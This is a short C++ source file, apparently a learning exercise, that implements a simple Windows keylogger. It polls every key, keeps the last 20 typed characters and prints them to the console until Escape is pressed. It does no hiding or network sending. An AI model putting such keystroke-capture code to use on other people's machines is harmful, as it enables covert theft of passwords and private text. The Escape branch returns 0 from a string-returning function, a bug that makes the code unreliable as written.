/*
Written in August of 2026 by Noga Levy.

With windows.h, keylogger.cpp creates a string logging the last 20 keys pressed.
*/


#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <unordered_map>
#include "functions.h"

std::string keylogger(std::string &key_history, std::unordered_map<int, int> &was_key_down){
    if (GetAsyncKeyState(VK_ESCAPE) & 0x8000){
        std::cout << "Ending Program" << std::endl;
        std::cout << key_history << std::endl;
        return 0;
    } else {
        // Running through all the keys
        for (int key = 0x08; key <= 0xFF; key++){
            // Checking if this key should be logged
            if (GetAsyncKeyState(key) & 0x8000){ // Is it pressed? [Yes to continue]
                if (!was_key_down[key]){ // Has the user been keeping it pressed? [No to continue]
                    // Update the map
                    was_key_down[key] = true;
                    
                    // LOGGING THE KEY
                    // Getting the status of the key modifiers
                    BYTE keyboard_state[256];
                    GetKeyboardState(keyboard_state);

                    for (int vk = 0; vk < 256; vk++) {
                        if (GetAsyncKeyState(vk) & 0x8000) {
                            keyboard_state[vk] |= 0x80;
                        }
                    }
                    
                    // Getting the hardware scan code for the key
                    int key_scan_code = MapVirtualKey(key, MAPVK_VK_TO_VSC);

                    // Setting up the output variable
                    WORD ascii_code;
                    int result = ToAscii(key, key_scan_code, keyboard_state, &ascii_code, 0);

                    // Storing the key into a string.
                    char helper_c = static_cast<char>(ascii_code);
                    std::string c = std::string(1, helper_c);
                    int str_length = key_history.length();

                    if (str_length == 20){
                        key_history = key_history.substr(1, str_length - 1);
                        key_history = key_history + c;
                    } else {
                        key_history = key_history + c;
                    }
                    
                    std::cout << "\033[2J\033[H" << std::flush;
                    std::cout << key_history;

                }
            } else {
                was_key_down[key] = false;
            }
        }
    }

    return key_history;
}